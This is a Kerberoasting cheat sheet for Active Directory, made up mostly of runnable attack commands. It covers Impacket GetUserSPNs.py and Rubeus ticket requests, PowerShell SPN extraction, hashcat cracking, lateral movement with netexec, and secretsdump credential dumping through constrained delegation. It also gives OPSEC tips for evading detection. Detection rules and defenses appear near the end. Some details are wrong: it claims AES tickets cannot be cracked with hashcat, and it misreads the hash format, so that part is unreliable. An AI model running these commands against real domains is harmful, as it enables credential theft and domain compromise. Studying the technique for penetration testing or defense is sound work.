# Kerberoasting

Request **TGS tickets** for service accounts (SPNs) and crack them offline. Any authenticated domain user can request tickets for any service.

## How It Works

```
User ──► AS-REQ ──► KDC (authenticated)
KDC  ──► AS-REP (TGT)
User ──► TGS-REQ (service ticket for SPN) ──► KDC
KDC  ──► TGS-REP (encrypted with service account hash)
Attacker cracks service account hash offline
```

## Prerequisites

- Valid domain credentials (any user)
- Domain Controller connectivity (TCP/88)
- At least one SPN-registered service account

## Linux — GetUserSPNs.py (Impacket)

### Request all SPN tickets
```bash
GetUserSPNs.py 'domain.local/user:Password123!' -dc-ip 10.10.10.10 -request -outputfile kerberoast_hashes.txt
```

### With specific SPN
```bash
GetUserSPNs.py 'domain.local/user:Password123!' -dc-ip 10.10.10.10 -request-user svc_sql -outputfile svc_sql_hash.txt
```

### Save in hashcat format
```bash
GetUserSPNs.py 'domain.local/user:Password123!' -dc-ip 10.10.10.10 -request -format hashcat -outputfile hashes.txt
```

### Using NTLM hash instead of password
```bash
GetUserSPNs.py 'domain.local/user' -hashes :LMHASH:NTHASH -dc-ip 10.10.10.10 -request -outputfile hashes.txt
```

### Target specific OU / DC
```bash
GetUserSPNs.py 'domain.local/user:Password123!' -dc-host dc01.domain.local -request -outputfile hashes.txt
```

### Output just the ticket blob (for Rubeus-style cracking)
```bash
GetUserSPNs.py 'domain.local/user:Password123!' -dc-ip 10.10.10.10 -request -outputfile tickets.txt
```

## Windows — Rubeus

### Kerberoast all SPNs
```cmd
Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

### Kerberoast specific user
```cmd
Rubeus.exe kerberoast /user:svc_sql /nowrap /outfile:svc_sql_hash.txt
```

### Using RC4 only (older, faster to crack)
```cmd
Rubeus.exe kerberoast /tgtdeleg /nowrap /outfile:hashes_rc4.txt
```

### With credential
```cmd
Rubeus.exe kerberoast /creduser:domain\user /credpassword:Password123! /outfile:hashes.txt /nowrap
```

### LDAP filter for targeting
```cmd
Rubeus.exe kerberoast /ldapfilter:"admincount=1" /nowrap /outfile:admin_hashes.txt
```

## Windows — PowerShell (Native)

```powershell
# Request TGS for a SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.domain.local:1433"
```

```powershell
# Bulk extract (manual)
setspn.exe -T domain.local -Q */* | Select-String '^CN' | ForEach-Object {
    $spn = $_ -replace '^CN=[^,]+,', '' -replace ',.*', ''
    try {
        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
    } catch {}
}
```

## Hashcat Cracking

```bash
# Kerberos 5 TGS-REP etype 23 (RC4) — mode 13100
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force

# With rules
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt -r best64.rule -O

# Kerberos 5 TGS-REP etype 18 (AES256) — this is NOT crackable with hashcat
# If you see $krb5tgs$23$*svc*$domain*$<type> — check <type>:
#   17 = AES128, 18 = AES256 — difficult/impossible to crack
#   23 = RC4 — easy to crack

# Force RC4 tickets with Rubeus /tgtdeleg to get crackable hashes
# Use --show to display recovered passwords
hashcat -m 13100 kerberoast_hashes.txt --show
```

### Hash Format
```
$krb5tgs$23$*user$domain.local$SPN*$<cipher>
```

## Full Attack Flow

```
1. Enumerate domain as any user
   netexec smb 10.10.10.10 -u 'user' -p 'pass' --users

2. Kerberoast all SPNs
   GetUserSPNs.py 'domain.local/user:pass' -dc-ip 10.10.10.10 -request -outputfile tickets.txt

3. Check encryption types in output (prioritize RC4 - $23)
   cat tickets.txt | grep -E '^\$krb5tgs\$23\$'

4. Crack RC4 hashes
   hashcat -m 13100 tickets.txt rockyou.txt -r best64.rule

5. Use cracked service account for lateral movement
   netexec smb 10.10.10.20 -u 'svc_sql' -p 'crackedpass'
```

## Advanced: Constrained Delegation Kerberoast

If you compromise a user with constrained delegation:
```bash
getST.py -impersonate administrator 'domain.local/user:pass' -spn cifs/target.domain.local
export KRB5CCNAME=administrator.ccache
secretsdump.py -k target.domain.local
```

## Detection & Signatures

**Windows Event Logs:**
- **Event ID 4769** — Kerberos service ticket requested
  - Look for many TGS-REQ from a single user for different SPNs in a short time
  - `Ticket Encryption Type: 0x17` (RC4) indicates legacy encryption (suspicious if environment uses AES)
- **Event ID 4648** — Logon with explicit credentials (if using /creduser)

**Network Signatures:**
- Multiple TGS-REQ from one source to different SPNs
- TGS-REQ for unusual service types (WWW, CIFS, HOST by non-admin users)
- RC4 ticket requests in AES-only environments

**Sigma Rules:**
```yaml
title: Kerberoasting
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
  timeframe: 5m
  condition: selection | count() by User > 10
```

**Hunting Query (KQL):**
```
EventID: 4769
| where TicketEncryptionType == "0x17"
| summarize count() by AccountName, TargetUserName, IpAddress
| where count_ > 5
```

## OPSEC Considerations

- **Authenticated** — Requires valid domain credentials (you're in the network already)
- **Noisy** — Each TGS request is logged (Event 4769)
- **RC4 priority** — Use `/tgtdeleg` to force RC4 for crackable hashes
- **ETW** — Windows Defender ATP and EDR tools detect kerberoasting patterns
- **Staging** — Request a few tickets at a time, space out requests
- **Target high-value** — Prioritize `admincount=1` accounts
- **Avoid DC SPNs** — DCs use `krbtgt` and `domain` SPNs that won't crack

## Defenses

- **Managed Service Accounts (gMSA)** — Automatic password rotation every 30 days
- **Group Managed Service Accounts** — No SPN password known to any user
- **AES-only encryption** — Disable RC4 for Kerberos (`Network security: Configure encryption types`)
- **Monitor** — Event ID 4769 with RC4 type; alert on volume anomalies
- **Set long (>25 char) random passwords** for all service accounts
- **Discovery**: `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`

## References

- Impacket: https://github.com/fortra/impacket
- Rubeus: https://github.com/GhostPack/Rubeus
- Tim Medin's original talk: "Attacking Kerberos"
- Active Directory Security blog: Kerberoasting
